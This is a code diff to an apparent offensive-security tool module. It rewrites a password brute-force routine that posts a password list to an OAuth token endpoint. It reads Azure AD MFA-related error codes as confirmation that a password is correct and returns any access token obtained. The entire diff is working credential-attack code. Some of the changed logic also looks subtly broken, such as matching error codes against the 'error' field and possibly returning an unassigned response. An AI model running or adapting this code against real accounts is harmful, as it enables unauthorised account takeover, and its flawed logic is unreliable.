@@ -39,6 +39,7 @@ def TechniqueMain(user_name, wait = None, client_id = None, password_file_conten
     except:
         return {"Error" : "Failed to read password file"}
 
+    attempts_count = 0
     # start bruteforce
     for password in passwords_list:
         data = {
@@ -50,25 +51,63 @@ def TechniqueMain(user_name, wait = None, client_id = None, password_file_conten
             "scope" : ' '.join(scope)
         }
 
-        '''Request access token'''
+        # increment attempt counter
+        attempts_count += 1
+
+        # request access token
         try:
-            raw_response = requests.post(url = endpoint_url, headers = headers, data = data).json()
+            raw_response = requests.post(url = endpoint_url, headers = headers, data = data)
             
-            #Checking for failed authentication
-            if 'error_codes' in raw_response:
-                # check for error codes that indicate correct password but auth failed due to other reasons
-                if any(e_code in [50076,50072, 50074, 50005, 50131] for e_code in raw_response['error_codes']):
-                    return {"Password" : password, "Access_Token" : None, "Additional_Info" : {"Result" : "Password found", "Error code" : raw_response['error_codes'], "Error":raw_response['error'], "Error_Description" : raw_response['error_description']}}
-                else:
-                    raise Exception("Invalid Password")
+            if 200 <= raw_response.status_code < 300:
+                try:
+                    access_token = raw_response.json().get('access_token')
+                    pretty_response = {}
+                    pretty_response["Success"] = {
+                        "Message" : "Password found",
+                        "Username" : user_name,
+                        "Matched Password" : password, 
+                        "Access Token" : access_token,
+                        "Additional Info" : {"Total Passwords" : len(passwords_list), "Attempted Passwords" : attempts_count} 
+                    }
 
-            access_token = raw_response['access_token']
-            return {"Password" : password, "Access_Token": access_token}
+                    return True, raw_response, pretty_response
+                except:
+                    return True, raw_response, None
+                
+            # check for error codes that indicate correct password but auth failed due to other reasons
+            elif any(e_code in [50076,50072, 50074, 50005, 50131] for e_code in raw_response.json().get('error')):
+                try:
+                    pretty_response = {}
+                    pretty_response = {
+                        "Message" : "Password found",
+                        "Username" : user_name,
+                        "Matched Password" : password,
+                        "Access Token" : None,
+                        "Additional Info" : {"Error code" : raw_response.json().get('error_codes', 'N/A'), "Error":raw_response.json().get('error', 'N/A'), "Error_Description" : raw_response.json().get('error_description', 'N/A')}
+                    }
+                    return True, raw_response, pretty_response
+                except:
+                    return True, raw_response, None
+            
+            else:
+                # continue bruteforce
+                raise Exception("Invalid Password")
 
-        except Exception as e:
+        except:
+            # wait before next attempt
             time.sleep(wait)
     
-    return {"Error" : "Bruteforce unsuccessful. No password match"}
+    # return reponse if bruteforce fails
+    pretty_response = {}
+    pretty_response["Completed"] = {
+        "Message" : "Bruteforce unsuccessful. No password match",
+        "Username" : user_name,
+        "Matched Password" : None, 
+        "Access Token" : None,
+        "Additional Info" : {"Total Passwords" : len(passwords_list), "Attempted Passwords" : attempts_count}
+    }
+
+    return False, raw_response, pretty_response
 
 
 def TechniqueInputSrc():
@@ -80,9 +119,3 @@ def TechniqueInputSrc():
         {"title" : "App ID (Optional)", "id" : "bf-client-id-text-input", "type" : "text", "placeholder" : "Optional (Default: Microsoft Office)", "element_type" : "dcc.Input"},
         {"title" : "Password File", "id" : "bf-password-file-uploader", "type" : "password", "placeholder" : "you got this right?", "element_type" : "dcc.Upload"}
     ]
-
-def TechniqueOutput(raw_response):
-    '''Returns a structured response'''
-    # initialize pretty response
-    pretty_response = raw_response
-    return pretty_response
